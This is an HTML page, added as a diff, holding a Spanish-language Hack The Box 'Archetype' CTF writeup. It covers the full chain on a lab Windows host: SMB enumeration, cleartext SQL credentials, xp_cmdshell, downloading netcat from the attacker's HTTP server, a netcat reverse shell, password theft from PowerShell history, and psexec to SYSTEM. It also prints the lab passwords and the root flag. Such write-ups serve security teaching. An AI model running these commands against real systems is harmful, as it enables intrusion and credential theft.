@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Archetype — Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Mono:wght@400;700&family=IBM+Plex+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #111118;
+    --surface2: #16161f;
+    --border: #1e1e2e;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --text: #e0e0f0;
+    --text-muted: #666680;
+    --text-dim: #3a3a5c;
+    --green: #00ff87;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --mono: 'JetBrains Mono', 'Space Mono', monospace;
+    --sans: 'IBM Plex Sans', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 16px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  /* Noise texture overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.4;
+  }
+
+  .wrapper {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 0 24px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── HEADER ── */
+  header {
+    padding: 64px 0 48px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 64px;
+  }
+
+  .meta-line {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 20px;
+  }
+
+  .meta-line span { color: var(--accent); }
+
+  h1 {
+    font-family: var(--mono);
+    font-size: clamp(48px, 8vw, 80px);
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    line-height: 1;
+    color: var(--text);
+    margin-bottom: 24px;
+  }
+
+  h1 .hash { color: var(--accent); }
+
+  .tags {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(0,212,255,0.06);
+    border: 1px solid rgba(0,212,255,0.2);
+    padding: 4px 12px;
+    border-radius: 2px;
+    letter-spacing: 0.05em;
+  }
+
+  /* ── SECTIONS ── */
+  section {
+    margin-bottom: 72px;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  section:nth-child(2) { animation-delay: 0.05s; }
+  section:nth-child(3) { animation-delay: 0.1s; }
+  section:nth-child(4) { animation-delay: 0.15s; }
+  section:nth-child(5) { animation-delay: 0.2s; }
+  section:nth-child(6) { animation-delay: 0.25s; }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .section-label .num { color: var(--accent); }
+
+  h2 {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.01em;
+    margin-bottom: 28px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  h2 .divider {
+    color: var(--text-dim);
+    margin: 0 10px;
+  }
+
+  p {
+    color: #aaaacc;
+    margin-bottom: 16px;
+    font-weight: 300;
+  }
+
+  strong { color: var(--text); font-weight: 600; }
+
+  /* ── CODE BLOCKS ── */
+  .code-block {
+    margin: 20px 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    background: var(--surface);
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 16px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+
+  .code-dots {
+    display: flex;
+    gap: 5px;
+  }
+
+  .code-dots span {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+  }
+
+  .code-dots .d1 { background: #ff5f57; }
+  .code-dots .d2 { background: #ffbd2e; }
+  .code-dots .d3 { background: #28c840; }
+
+  pre {
+    padding: 20px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.6;
+    color: #c0c0e0;
+  }
+
+  .cmd { color: var(--accent); }
+  .flag-val { color: var(--green); }
+  .comment { color: var(--text-dim); }
+  .highlight { color: var(--accent2); font-weight: 700; }
+  .err { color: var(--red); }
+
+  /* ── TABLE ── */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 20px 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+
+  thead tr {
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  th {
+    padding: 10px 18px;
+    text-align: left;
+    color: var(--text-muted);
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    font-weight: 400;
+  }
+
+  td {
+    padding: 11px 18px;
+    color: #aaaacc;
+    border-bottom: 1px solid rgba(30,30,46,0.6);
+  }
+
+  tr:last-child td { border-bottom: none; }
+
+  .status-open {
+    color: var(--green);
+    font-size: 11px;
+    letter-spacing: 0.05em;
+  }
+
+  .port-num { color: var(--accent); }
+  .svc-name { color: var(--text); }
+
+  /* ── CALLOUT ── */
+  .callout {
+    display: flex;
+    gap: 16px;
+    padding: 16px 20px;
+    background: rgba(0,212,255,0.04);
+    border: 1px solid rgba(0,212,255,0.15);
+    border-left: 3px solid var(--accent);
+    border-radius: 0 4px 4px 0;
+    margin: 20px 0;
+  }
+
+  .callout-icon {
+    font-size: 18px;
+    line-height: 1.5;
+    flex-shrink: 0;
+  }
+
+  .callout p {
+    margin: 0;
+    font-size: 14px;
+    color: #9090b8;
+  }
+
+  .callout strong { color: var(--accent); }
+
+  .callout.warn {
+    background: rgba(255,107,53,0.04);
+    border-color: rgba(255,107,53,0.15);
+    border-left-color: var(--accent2);
+  }
+
+  .callout.warn p { color: #9090b8; }
+  .callout.warn strong { color: var(--accent2); }
+
+  /* ── FLAG ── */
+  .flag-box {
+    margin: 24px 0;
+    padding: 20px 24px;
+    background: var(--surface);
+    border: 1px solid rgba(0,255,135,0.2);
+    border-left: 3px solid var(--green);
+    border-radius: 0 4px 4px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 4px;
+    opacity: 0.7;
+  }
+
+  .flag-value {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--green);
+    letter-spacing: 0.05em;
+  }
+
+  /* ── SUMMARY ── */
+  .summary-section {
+    margin-top: 80px;
+    padding-top: 48px;
+    border-top: 1px solid var(--border);
+  }
+
+  .summary-title {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .summary-heading {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 40px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .chain {
+    display: grid;
+    gap: 0;
+  }
+
+  .chain-step {
+    display: grid;
+    grid-template-columns: 48px 1fr;
+    gap: 20px;
+    padding-bottom: 32px;
+    position: relative;
+  }
+
+  .chain-step:not(:last-child)::before {
+    content: '';
+    position: absolute;
+    left: 23px;
+    top: 40px;
+    bottom: 0;
+    width: 1px;
+    background: var(--border);
+  }
+
+  .step-num {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+    flex-shrink: 0;
+    position: relative;
+    z-index: 1;
+  }
+
+  .chain-step.final .step-num {
+    background: rgba(0,255,135,0.08);
+    border-color: rgba(0,255,135,0.3);
+    color: var(--green);
+    font-size: 18px;
+  }
+
+  .step-content { padding-top: 12px; }
+
+  .step-title {
+    font-family: var(--mono);
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+
+  .step-desc {
+    font-size: 14px;
+    color: var(--text-muted);
+    font-weight: 300;
+    margin: 0;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    margin-top: 80px;
+    padding: 32px 0;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .footer-brand {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.1em;
+  }
+
+  .footer-brand span { color: var(--accent); }
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+  <!-- HEADER -->
+  <header>
+    <p class="meta-line">// <span>Hack The Box</span> — Starting Point // CTF Writeup</p>
+    <h1><span class="hash">#</span>ARCHETYPE</h1>
+    <div class="tags">
+      <span class="tag">#windows</span>
+      <span class="tag">#mssql</span>
+      <span class="tag">#impacket</span>
+      <span class="tag">#smb</span>
+      <span class="tag">#xp_cmdshell</span>
+    </div>
+  </header>
+
+  <!-- 01 RECONOCIMIENTO -->
+  <section>
+    <p class="section-label"><span class="num">// 01</span></p>
+    <h2>RECONOCIMIENTO <span class="divider">—</span> Escaneo de puertos</h2>
+
+    <p>Lo primero es verificar conectividad con la máquina objetivo y descubrir su superficie de ataque. Se confirma que la máquina responde y se lanza un escaneo completo de puertos.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">escaneo inicial</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">nmap -p- --min-rate=5000 &lt;IP&gt; -oG allPorts</span></pre>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Puerto</th>
+            <th>Estado</th>
+            <th>Servicio</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td class="port-num">135/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">msrpc</td></tr>
+          <tr><td class="port-num">139/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">netbios-ssn</td></tr>
+          <tr><td class="port-num">445/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">microsoft-ds (SMB)</td></tr>
+          <tr><td class="port-num">1433/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">ms-sql-s (MSSQL)</td></tr>
+          <tr><td class="port-num">5985/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">wsman</td></tr>
+          <tr><td class="port-num">47001/tcp</td><td><span class="status-open">OPEN</span></td><td class="svc-name">winrm</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>El puerto <strong>1433</strong> aloja un servidor Microsoft SQL Server. El puerto <strong>445</strong> indica que hay un servicio SMB activo. Son los dos vectores de ataque a explorar.</p>
+  </section>
+
+  <!-- 02 SMB -->
+  <section>
+    <p class="section-label"><span class="num">// 02</span></p>
+    <h2>ENUMERACIÓN SMB <span class="divider">—</span> Credenciales en texto claro</h2>
+
+    <p>Se listan los shares disponibles en el servicio SMB sin necesidad de autenticación, usando la flag <strong>-N</strong> para null session.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">listado de shares</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">smbclient -L //&lt;IP&gt;/ -N</span>
+
+  Sharename       Type      Comment
+  ---------       ----      -------
+  ADMIN$          Disk      Remote Admin
+  <span class="highlight">backups</span>         Disk
+  C$              Disk      Default share
+  IPC$            IPC       Remote IPC</pre>
+    </div>
+
+    <p>Los shares administrativos terminan en <strong>$</strong>. El único share sin ese sufijo — y por tanto el único accesible sin privilegios — es <strong>backups</strong>. Se accede directamente:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">acceso al share backups</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">smbclient //&lt;IP&gt;/backups -N</span>
+
+smb: \> ls
+  <span class="highlight">prod.dtsConfig</span>    AR    609   Mon Jan 20 13:23:02 2020
+
+smb: \> get prod.dtsConfig</pre>
+    </div>
+
+    <p>Se descarga el fichero <strong>prod.dtsConfig</strong>. Los archivos <code>.dtsConfig</code> son ficheros de configuración de paquetes SSIS (SQL Server Integration Services) de Microsoft, y habitualmente contienen cadenas de conexión a bases de datos. Al examinar su contenido se encuentran credenciales en texto claro:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">prod.dtsConfig</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre>&lt;DTSConfiguration&gt;
+  &lt;DTSConfigurationHeading&gt;...&lt;/DTSConfigurationHeading&gt;
+  &lt;Configuration ConfiguredType="Property"
+    Path="\Package.Connections[Destination].Properties[ConnectionString]"&gt;
+    &lt;ConfiguredValue&gt;Data Source=.;
+      <span class="highlight">Password=M3g4c0rp123;</span>
+      User ID=<span class="highlight">ARCHETYPE\sql_svc</span>;
+      Initial Catalog=Catalog;
+      Provider=SQLNCLI10.1;
+      Persist Security Info=True;
+      Auto Translate=False;
+    &lt;/ConfiguredValue&gt;
+  &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;</pre>
+    </div>
+
+    <div class="callout">
+      <span class="callout-icon">🔑</span>
+      <p><strong>Credenciales encontradas:</strong> Usuario <strong>ARCHETYPE\sql_svc</strong> con contraseña <strong>M3g4c0rp123</strong>. El error típico de dejar credenciales en ficheros de configuración de backups accesibles por SMB.</p>
+    </div>
+  </section>
+
+  <!-- 03 MSSQL -->
+  <section>
+    <p class="section-label"><span class="num">// 03</span></p>
+    <h2>ACCESO MSSQL <span class="divider">—</span> xp_cmdshell</h2>
+
+    <p>Con las credenciales obtenidas se usa <strong>mssqlclient.py</strong> de la suite Impacket para establecer una sesión autenticada contra el servidor SQL. La flag <code>-windows-auth</code> es necesaria porque las credenciales son de dominio Windows.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">conexión con mssqlclient.py</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">impacket-mssqlclient ARCHETYPE/sql_svc:'M3g4c0rp123'@&lt;IP&gt; -windows-auth</span>
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'
+[!] Press help for extra shell commands
+
+SQL (ARCHETYPE\sql_svc  dbo@master)></pre>
+    </div>
+
+    <p>La conexión es exitosa. El siguiente paso es obtener ejecución de comandos en el sistema operativo. Para ello se usa el procedimiento almacenado extendido <strong>xp_cmdshell</strong>, que permite lanzar comandos de shell directamente desde una consulta SQL.</p>
+
+    <p>Al intentarlo por primera vez, el servidor lo bloquea porque está deshabilitado por defecto como medida de seguridad. Sin embargo, dado que el usuario tiene permisos de <strong>sysadmin</strong>, es posible habilitarlo:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">habilitar y usar xp_cmdshell</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="comment">-- Primer intento: bloqueado</span>
+SQL> xp_cmdshell "whoami"
+<span class="err">ERROR: SQL Server blocked access to procedure 'sys.xp_cmdshell'...</span>
+
+<span class="comment">-- Habilitarlo con el comando especial de Impacket</span>
+SQL> enable_xp_cmdshell
+[*] INFO: Configuration option 'xp_cmdshell' changed from 0 to 1.
+
+<span class="comment">-- Ahora sí funciona</span>
+SQL> xp_cmdshell "whoami"
+output
+------------------
+<span class="highlight">archetype\sql_svc</span></pre>
+    </div>
+  </section>
+
+  <!-- 04 REVERSE SHELL -->
+  <section>
+    <p class="section-label"><span class="num">// 04</span></p>
+    <h2>REVERSE SHELL <span class="divider">—</span> Netcat en la víctima</h2>
+
+    <p>Tener ejecución de comandos vía <code>xp_cmdshell</code> es útil, pero trabajar así es limitado. El objetivo es obtener una shell interactiva. Para ello se transfiere <strong>nc64.exe</strong> (Netcat para Windows de 64 bits) a la máquina víctima usando un servidor HTTP temporal en la máquina atacante.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">máquina atacante — servidor HTTP</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="comment"># Tener nc64.exe en el directorio actual</span>
+<span class="cmd">python3 -m http.server 80</span>
+Serving HTTP on 0.0.0.0 port 80 ...</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">máquina víctima — descarga de netcat</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre>SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; <span class="highlight">wget http://&lt;TU_IP&gt;/nc64.exe -outfile nc64.exe</span>"</pre>
+    </div>
+
+    <p>Con Netcat ya en la máquina víctima, se pone el listener en escucha y se lanza la reverse shell:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">listener en máquina atacante</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">nc -lvnp 4444</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">lanzar reverse shell desde MSSQL</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre>SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; <span class="highlight">.\nc64.exe -e cmd.exe &lt;TU_IP&gt; 4444</span>"</pre>
+    </div>
+
+    <p>La conexión llega al listener. Se dispone de una shell completa como <strong>archetype\sql_svc</strong>. La flag de usuario se encuentra en su escritorio:</p>
+
+    <div class="flag-box">
+      <div>
+        <span class="flag-label">User Flag</span>
+        <span class="flag-value">C:\Users\sql_svc\Desktop\user.txt</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 05 PRIVILEGE ESCALATION -->
+  <section>
+    <p class="section-label"><span class="num">// 05</span></p>
+    <h2>PRIVILEGE ESCALATION <span class="divider">—</span> ConsoleHost_history.txt</h2>
+
+    <p>Con acceso como <code>sql_svc</code>, el objetivo es escalar a <strong>Administrator</strong>. Se transfiere y ejecuta <strong>WinPEAS</strong> (Windows Privilege Escalation Awesome Script), una herramienta que automatiza la búsqueda de vectores de escalada en entornos Windows.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">transferir y ejecutar WinPEAS</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="comment"># En la máquina atacante (mismo servidor HTTP activo)</span>
+<span class="comment"># Descargar winPEASx64.exe en la víctima desde la shell</span>
+C:\Users\sql_svc\Downloads> <span class="cmd">wget http://&lt;TU_IP&gt;/winPEASx64.exe -outfile winPEASx64.exe</span>
+C:\Users\sql_svc\Downloads> <span class="cmd">.\winPEASx64.exe</span></pre>
+    </div>
+
+    <p>En la sección de análisis de ficheros Windows, WinPEAS marca en rojo varios archivos sensibles. El primero de ellos es especialmente interesante:</p>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠</span>
+      <p><strong>Marcado en rojo por WinPEAS:</strong><br>
+      <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
+    </div>
+
+    <p>Este fichero es el equivalente en Windows al <code>.bash_history</code> de Linux: guarda el historial de comandos ejecutados en PowerShell. Es un lugar donde frecuentemente quedan expuestas credenciales tecleadas manualmente. Al leerlo:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">ConsoleHost_history.txt</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre>C:\> <span class="cmd">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span>
+
+net.exe use T: \\Archetype\backups /user:administrator <span class="highlight">MEGACORP_4dm1n!!</span></pre>
+    </div>
+
+    <p>El administrador montó un share de red en algún momento tecleando la contraseña directamente en PowerShell, que quedó registrada en el historial. La contraseña del administrador es <strong>MEGACORP_4dm1n!!</strong>.</p>
+  </section>
+
+  <!-- 06 ROOT -->
+  <section>
+    <p class="section-label"><span class="num">// 06</span></p>
+    <h2>ACCESO COMO ROOT <span class="divider">—</span> psexec.py</h2>
+
+    <p>Con las credenciales del administrador se usa <strong>psexec.py</strong> de Impacket para obtener una shell con máximos privilegios. PSExec funciona subiendo un servicio al share ADMIN$ y ejecutándolo remotamente, lo que devuelve una shell como <strong>SYSTEM</strong>.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">acceso como administrator</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre><span class="cmd">impacket-psexec administrator@&lt;IP&gt;</span>
+Password: <span class="highlight">MEGACORP_4dm1n!!</span>
+
+[*] Requesting shares on 10.129.95.187.....
+[*] Found writable share ADMIN$
+[*] Uploading file OsaIJSOv.exe
+[*] Opening SVCManager on 10.129.95.187.....
+[*] Creating service VDJl on 10.129.95.187.....
+[*] Starting service VDJl.....
+
+Microsoft Windows [Version 10.0.17763.2061]
+C:\Windows\system32></pre>
+    </div>
+
+    <p>Acceso completo como administrador del sistema. La flag de root se encuentra en el escritorio del usuario Administrator:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-label">root flag</span>
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+      </div>
+      <pre>C:\Windows\system32> <span class="cmd">cd C:\Users\Administrator\Desktop</span>
+C:\Users\Administrator\Desktop> <span class="cmd">dir</span>
+
+02/25/2020  06:36 AM    32 <span class="flag-val">root.txt</span>
+
+C:\Users\Administrator\Desktop> <span class="cmd">type root.txt</span>
+<span class="flag-val">b91ccec3305e98240082d4474b848528</span></pre>
+    </div>
+
+    <div class="flag-box">
+      <div>
+        <span class="flag-label">Root Flag</span>
+        <span class="flag-value">b91ccec3305e98240082d4474b848528</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- SUMMARY -->
+  <div class="summary-section">
+    <p class="summary-title">// RESUMEN</p>
+    <h2 class="summary-heading">CADENA DE ATAQUE</h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="step-num">01</div>
+        <div class="step-content">
+          <p class="step-title">Enumeración SMB</p>
+          <p class="step-desc">Share <code>backups</code> accesible sin autenticación. Contiene <code>prod.dtsConfig</code> con credenciales SQL en texto claro: <code>ARCHETYPE\sql_svc / M3g4c0rp123</code></p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="step-num">02</div>
+        <div class="step-content">
+          <p class="step-title">Acceso MSSQL + xp_cmdshell</p>
+          <p class="step-desc">Conexión autenticada con <code>mssqlclient.py</code>. El usuario tiene permisos de sysadmin, lo que permite habilitar <code>xp_cmdshell</code> y ejecutar comandos en el sistema operativo</p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="step-num">03</div>
+        <div class="step-content">
+          <p class="step-title">Reverse Shell como sql_svc</p>
+          <p class="step-desc">Transferencia de <code>nc64.exe</code> vía HTTP + reverse shell interactiva → flag de usuario obtenida de <code>C:\Users\sql_svc\Desktop\user.txt</code></p>
+        </div>
+      </div>
+      <div class="chain-step">
+        <div class="step-num">04</div>
+        <div class="step-content">
+          <p class="step-title">WinPEAS → ConsoleHost_history.txt</p>
+          <p class="step-desc">WinPEAS detecta el historial de PowerShell con una contraseña tecleada en claro: <code>administrator / MEGACORP_4dm1n!!</code></p>
+        </div>
+      </div>
+      <div class="chain-step final">
+        <div class="step-num">⚡</div>
+        <div class="step-content">
+          <p class="step-title">Root via psexec.py</p>
+          <p class="step-desc">Acceso como SYSTEM con <code>impacket-psexec</code> → flag de root en <code>C:\Users\Administrator\Desktop\root.txt</code></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <span class="footer-brand">ARCHETYPE <span>//</span> WRITEUP <span>//</span> HACK THE BOX</span>
+    <span class="footer-brand" style="color: var(--text-dim)">Starting Point</span>
+  </footer>
+
+</div>
+</body>
+</html>
